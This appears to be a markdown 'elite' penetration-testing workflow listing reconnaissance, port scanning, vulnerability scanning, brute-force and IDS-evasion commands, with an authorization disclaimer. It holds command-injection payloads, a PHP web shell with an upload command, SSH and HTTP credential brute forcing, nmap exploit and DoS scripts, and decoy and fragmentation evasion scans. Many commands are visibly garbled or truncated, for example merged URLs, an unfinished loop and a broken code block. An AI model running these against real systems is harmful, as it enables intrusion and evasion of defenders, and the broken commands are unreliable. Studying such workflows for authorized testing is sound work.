# **🚀 Elite Network Vulnerability Scanning Workflow 2025**

## **
**This workflow is for authorized penetration testing and educational purposes only. Always ensure you have explicit permission before scanning any network.**

---

## **📋  Tool Installation**

### **Essential Scanners
sudo apt install nmap masscan zmap unicornscan hping3 -y

# Go Tools
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/projectdiscovery/httpx/cm github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest

# Python Tools
pip3 install sqlmap dirsearch droopescan wpscan shodan censys-python

# Additional Tools
git clone https://github.com/rbsec/dnscan.git
git clone https://github.com/aboul3la/Sublist3com/maurosoria/dirsearch.git
git clone https://github.com/ffuf/ffuf.git
```

---

## **🎯 Phase 1: Network Discovery & Reconnaissance**

### **Step 1.1: Target Validation & OSINT**
```bash
# Create project directory
mkdir network_scan_$(date +%Y%m%d network_scan_*
export TARGET="target.com"

# OSINT Collection
echo "[+] Starting OSINT Collection..."
whois $TARGET | tee whois_info.txt
dig +trace $TARGET | tee dns_trace.txt
nslookup $TARGET | tee nslookup.txt

# Shodan Intelligence (if API key available)
shodan host $TARGET | tee shodan_info.txt
```

### **Step 1.2: Subdomain Enumeration (Elite Level)**
```bash
echo "[+] Elite Subdomain Discovery..."

# Method 1: Certificate Transparency
curl -s "https://c25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew subdomains.txt

# Method 2: Multiple Sources
subfinder -d $TARGET -all
assetfinder --subs-only $TARGET | anew subdomains.txt

# Method 3: DNS Bruteforce (Elite Wordlist)
dnscan -d $TARGET -w /usr/share/wordlists/dns-Jhaddix.txt | anew subdomains.txt

# Method 4: Reverse DNS on IP ranges
nmap -sL $(dig +short $TARGET)/24 | grep "not scanned" | awk '{print $2}' | anew potential_hosts.txt

# Method 5: Alternative DNS resolvers
echo "8.8.8.8
1.1.1.1
208.67.222.222
9.9.9.9" > resolvers.txt

cat subdomains.txt | dnsx -resolver resolvers.txt -a -resp | anew resolved_subdomains.txt
```

### **Step 1.3: Live Host Detection (Advanced)**
```bash
echo "[+] Advanced Live Host Detection..."

# Extract IPs from resolved subdomains
cat resolved_subdomains.txt | awk '{print $2}' | sort -u > target_ips.txt

# Multiple ping techniques
nmap -sn - --min-rate 1000 | grep "Nmap scan report" | awk '{print $5}' > live_hosts.txt

# HTTP/HTTPS service detection
cat subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,8888,9443,9000,3000,5000 -threads 100 -status-code -title -tech-detect -cdn -o alive_web_services.txt

# Alternative port checking with naabu
cat subdomains.txt | naabu -p 1-65535 -rate 1000 -silent | anew all_open_ports.txt
```

---

## **🔍 Phase 2: Port Scanning & Service Discovery**

### **Step 2.1: MEDIUM Intensity Scanning**
```bash
echo "[+] MEDIUM Level Port Scanning..."

# TCP SYN Scan (Medium)
nmap -sS -T4 -p1-10000 --open -iL live_hosts.txt -oA medium_tcp_scan

# UDP Top Ports (Medium)
sudo nmap -sU -T4 --top-ports 1000 --open -iL live_hosts.txt -oA medium_udp_scan

# Service Version Detection (Medium)
nmap -sV -T4 -p- --version-intensity 5 -iL live_hosts.txt -oA medium_service_scan

# Script Scanning (Medium Risk)
nmap -sC --script=default,discovery,safe -p- -iL live_hosts.txt -oA medium_script_scan
```

### **Step 2.2: HIGH Intensity Scanning**
```bash
echo "[+] HIGH Level Elite Scanning..."

# Aggressive TCP Scan
sudo masscan -p1-65535 -iL live_hosts.txt --rate=10000 --output-format grepable --output-filename high_masscan.txt

# Advanced Nmap Techniques
nmap -sS -sU -T5 -A -p- --script=vuln,exploit,malware --script-args=unsafe=1 -iL live_hosts.txt -oA high_aggressive_scan

# OS Fingerprinting (Elite)
nmap -O -T4 --osscan-guess --fuzzy -iL live_hosts.txt -oA high_os_detection

# Firewall/IDS Evasion Techniques
nmap -f -t 0 -n -Pn --data-length 200 --ip-options 'S 192.168.1.1 192.168.1.2' -p1-1000 -iL live_hosts.txt -oA high_evasion_scan

# Advanced Script Categories
nmap --script="auth,brute,discovery,dos,exploit,external,fuzzer,intrusive,malware,safe,version,vuln" -p- -iL live_hosts.txt -oA high_comprehensive_scripts
```

### **Step 2.3: CRITICAL Level Elite Scanning**
```bash
echo "[+] CRITICAL Level Elite Techniques..."

# Maximum Intensity Scan
sudo nmap -sS -sU -sY -sZ -sO -T5 -A -p- --defeat-rst-ratelimit --defeat-icmp-ratelimit --source-port 53 --data-length 1024 -iL live_hosts.txt -oA critical_maximum_scan

# Multi-Protocol Scanning
sudo unicornscan -mT -p1-65535 -l live_hosts.txt > critical_unicornscan_tcp.txt
sudo unicornscan -mU -p1-10000 -l live_hosts.txt > critical_unicornscan_udp.txt

# Advanced Evasion (Anti-Firewall)
nmap -sI zombie_host -p1-1000 -iL live_hosts.txt -oA critical_idle_scan
nmap -sA -T5 --scan-delay 10ms1-65535 -iL live_hosts.txt -oA critical_ack_scan

# IPv6 Discovery (if applicable)
nmap -6 -sS -p1-1000 -iL live_hosts.txt -oA critical_ipv6_scan

# Custom NSE Scripts (Elite)
nmap --script="ssl-cert,ssl-enum-ciphers,http-enum,http-methods,http-headers,ftp-anon,smb-enum-shares,smb-protocols,ssh-auth-methods,snmp-info" -p- -iL live_hosts.txt -oA critical_elite_scripts
```

---

## **🛠️ Phase 3: Service-Specific Vulnerability Assessment**

### **Step 3.1: Web Application Testing**
```bash
echo "[+/File Bruteforcing (Elite Wordlists)
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    di /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -e php,asp,aspx,jsp,js,html,do,action -t 50 --full-url --output=dirsearch_$url.txt
done

# Advanced HTTP Methods Testing
cat alive_web_services.txt | awk '{print $1}' | httpx -http-methods -silent -o http_methods.txt

# SSL/TLS Security Testing
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    nmap --script ssl-enum-ciphers,ssl-cert,ssl-ccs-injection,ssl-heartbleed,ssl-poodle -p 443 $url
done

# WordPress/CMS Detection & Scanning
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    if [[ $(curl -s $url | grep -i wordpress) ]]; then
        wpscan --url $url --enumerate ap,at,cb,dbe --plugins-detection aggressive --api-token YOUR_API_TOKEN
    fi
done
```

### **Step 3.2: Database Service Testing**
```bash
echo "[+] Database Vulnerability Testing..."

# MySQL/MariaDB (Port 3306)
nmap --script mysql-info,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p 3306 -iL live_hosts.txt

# PostgreSQL (Port 5432)
nmap --script pgsql-brute,pgsql-databases -p 5432 -iL live_hosts.txt

# MSSQL (Port 1433)
nmap --script ms-sql-info,ms-sql-config,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-query -p 1433 -iL live_hosts.txt

# MongoDB (Port 27017)
nmap --script mongodb-info,mongodb-databases -p 27017 -iL live_hosts.txt

# Redis (Port 6379)
nmap --script redis-info -p 6379 -iL live_hosts.txt
```

### **Step 3.3: Network Services Exploitation**
```bash
echo "[+] Network Services Vulnerability Testing..."

# SMB/NetBIOS Testing
nmap --script smb-vuln-ms17-010,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb2-vuln-uptime -p 445,139 -iL live_hosts.txt

# SSH Security Testing
nmap --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos -p 22 -iL live_hosts.txt

# FTP Testing
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 -iL live_hosts.txt

# SNMP Enumeration
nmap --script snmp-info,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-interfaces -p 161 -iL live_hosts.txt

# DNS Testing
nmap --script dns-zone-transfer,dns-recursion,dns-cache-snoop,dns-nsec-enum,dns-nsec3iL live_hosts.txt
```

---

## **💥 Phase 4: Advanced Vulnerability Discovery**

### **Step 4.1: Nuclei Template-Based Scanning**
```bash
echo "[+] Advanced Nuclei Vulnerability Scanning..."

# Update nuclei templates
nuclei -update-templates

# MEDIUM Severity Scanning
cat alive_web_services.txt | awk '{print $1}' | nuclei -t ~/nuclei-templates/ -severity medium -o nuclei_medium_results.txt

# HIGH Severity Scanning
cat alive_web_services.txt | awk '{print $1}' | nuclei -t ~/nuclei-templates/ -severity high -o nuclei_high_results.txt

# CRITICAL Severity Scanning
cat alive_web_services.txt | awk '{print $1}' | nuclei -t ~/nuclei-templates/ -severity critical -o nuclei_critical_results.txt

# Custom CVE Scanning
cat alive_web_services.txt | awk '{print $1}' | nuclei -t ~/nuclei-templates/cves/ -o nuclei_cve_results.txt

# Technology-Specific Templates
cat alive_web_services.txt | awk '{print $1}' | nuclei -t ~/nuclei-templates/technologies/ -o nuclei_tech_results.txt
```

### **Step 4.2: Custom Vulnerability Scripts**
```bash
echo "[+] Custom Elite Vulnerability Testing..."

# Buffer Overflow Testing
nmap --script unusual-port,http-slowloris-check,http-slow-request -iL live_hosts.txt

# Authentication Bypass Testing
nmap --script auth-owners,auth-spoof,http-auth-finder,http-default-accounts -iL live_hosts.txt

# Information Disclosure
nmap --script http-enum,http-headers,http-methods,http-robots.txt,http-sitemap-generator -iL live_hosts.txt

# Command Injection Testing
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    echo "Testing: $url"
    curl -s "$url" -d "cmd=;id;" -X POST
    curl -s "$url" -d "exec=\`whoami\`" -X POST

## **🔒 Phase 5: Post-Exploitation & Deep Analysis**

### **Step 5.1: Service Banner Grabbing**
```bash
echo "[+] Advanced Banner Grabbing..."

# Custom Banner Grabbing Script
for ip in $(cat live_hosts.txt); do
    echo "[+] Testing $ip"
    for port in 21 22 23 25 53 80 110 111 135 139 143 443 993 995 1723 3306 3389 5432 5900 6000; do
        timeout 5 bash -c "echo '' | nc -nv $ip $port" 2>&1 | grep -E "(SSH|HTTP|FTP|SMTP|MySQL|RDP)" && echo "$ip:$port - Banner found"
    done
done > banner_grab_results.txt
```

### **Step 5.2: Credential Testing (Authorized Only)**
```bash
echo "[+] Default Credential Testing..."

# Common Service Credentials
cat > common_creds.txt << EOF
admin:admin
admin:password
root:root
root:password
administrator:password
guest:guest
test:test
EOF

# SSH Brute Force (Limited attempts)
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt,ssh-brute.timeout=4s -p 22 -iL live_hosts.txt

# HTTP Basic Auth Testing
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    hydra -C common_creds.txt $url http-get /admin
done
```

---

## **📊 Phase 6: Results Analysis & Reporting**

### **Step 6.1: Vulnerability Classification**
```bash
echo "[+] Analyzing and Categorizing Results..."

# Create severity-based reports
echo "=== CRITICAL VULNERABILITIES ===" > final_report.txt
cat nuclei_critical_results.txt >> final_report.txt
echo -e "\n=== HIGH VULNERABILITIES ===" >> final_report.txt
cat nuclei_high_results.txt >> final_report.txt
echo -e "\n=== MEDIUM VULNERABILITIES ===" >> final_report.txt
cat nuclei_medium_results.txt >> final_report.txt

# Extract unique vulnerabilities
cat nuclei_*_results.txt | grep -oE "\[.*\]" | sort -u > unique_vulnerabilities.txt

# Count vulnerabilities by severity
echo "Critical: $(cat nuclei_critical_results.txt | wc -l)" > vulnerability_summary.txt
echo "High: $(cat nuclei_high_results.txt | wc -l)" >> vulnerability_summary.txt
echo "_results.txt | wc -l)" >> vulnerability_summary.txt
```

### **Step 6.2 Collection**
```bash
echo "[+] Collecting Evidence..."

# Screenshot evidence for web vulnerabilities
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    curl -s "$url" -o "evidence_$(echo $url | sed 's|https\?://||' | tr '/' '_').html"
done

# Port scan evidence
nmap -oX final_nmap_scan.xml -iL live_hosts.txt -p- -sV

# Create timeline
echo "Scan started: $(date)" > scan_timeline.txt
echo "Total hosts scanned: $(cat live_hosts.txt | wc -l)" >> scan_timeline.txt
echo "Total vulnerabilities found: $(cat nuclei_*_results.txt | wc -l)" >> scan_timeline.txt
echo "Scan completed: $(date)" >> scan_timeline.txt
```

---

## **🚨 Phase 7: Advanced Evasion Techniques (Critical Level)**

### **Step 7.1: Anti-Detection Scanning**
```bash
echo "[+] Implementing Evasion Techniques..."

# Slow scan with randomized timing
nmap -T1 --randomize-hosts --spoof-mac 0 --source-port 53 -p1-1000 -iL live_hosts.txt -oA stealth_scan

# Fragmented packets
nmap -f --mtu 8 -p1-1000 -iL live_hosts.txt -oA fragmented_scan

# Decoy scanning
nmap -D RND:10 -p1-1000 -iL live_hosts.txt -oA decoy_scan

# Custom User-Agent rotation for web scanning
cat alive_web_services.txt | awk '{print $1}' | while read url; do
    USER_AGENTS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
    UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    curl -s -H "User-Agent: $UA" "$url" > /dev/null
done
```

---

## **📈 Manual Testing Commands (Elite Level)**

### **Individual Command Reference**
```bash
# Single host comprehensive scan
nmap -sS -sU -sY -sZ -sO -A -p- --script=all --defeat-rst-ratelimit --defeat-icmp-ratelimit TARGET_IP

# Advanced web vulnerability testing
sqlmap -u "http://target.com/page.php?id=1" --batch --level=5 --risk=3 --tamper=space2comment,charencode --dbs

# Custom payload testing
echo "<?php system(\$_GET['cmd']); ?>" | base64
curl -X POST http://target.com/upload.php -F "file=@shell.php"

# Memory corruption testing
python -c "print 'A' * 1000" | nc target.com 9999

# SSL/TLS comprehensive testing
testssl.sh --full https://target.com

# DNS zone transfer attempt
dig @target.com target.com axfr
```

---

## **🔧 Tool Configuration Files**

### **Custommap NSE Scripts Location**
```bash
# Add custom scripts to:
/usr/share/nmap/scripts/

# Update script database:
nmap --script-updatedb
```

### **Nuclei Custom Templates**
```bash
# Create custom template directory:
mkdir ~/custom-nuclei-templates

# Example custom template structure:
echo 'id: custom-rce-test
info:
  name: Custom RCE Test
  severity: critical
requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin/exec?cmd=id"
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        condition: and' > ~/custom-nuclei-templates/custom-rce.yaml
```

---

## **⚡ Quick Reference Commands**

### **One-liner Network Discovery**
```bash
nmap -sn 192.168.1.0/24 | grep -oP '(?<=Nmap scan report for )[^ ]*' | naabu -p 1-65535 -silent | httpx -silent -title -tech-detect
```

### **Fast Vulnerability Discovery**
```bash
echo "target.com" | subfinder -silent | httpx -silent | nuclei -t ~/nuclei-templates/ -severity critical,high -silent
```

### **Complete Automated Scan**
```bash
# Save as auto_scan.sh
#!/bin/bash
TARGET=$1
mkdir scan_$TARGET
cd scan_$TARGET
echo $TARGET | subfinder -silent > subs.txt
cat subs.txt | httpx -silent > alive.txt
cat alive.txt | nuclei -t ~/nuclei-templates/ -o vulnerabilities.txt
nmap -iL alive.txt -p- -A -oA nmap_scan
echo "Scan complete! Check vulnerabilities.txt"
```

---

## **📝 Notes & Best Practices**

1. **Always get written authorization** before scanning any network
2. **Use VPN/Proxy** for sensitive testing environments
3. **Rate limit your scans** to avoid DoS conditions
4. **Document everything** with timestamps and evidence
5. **Verify findings manually** before reporting
6. **Use different scan timing** based on network sensitivity
7. **Keep tools updated** regularly for latest CVE coverage
8. **Backup your results** in multiple formats

---

**🎯 Happy Ethical Hacking! Remember: With great power comes great responsibility.**
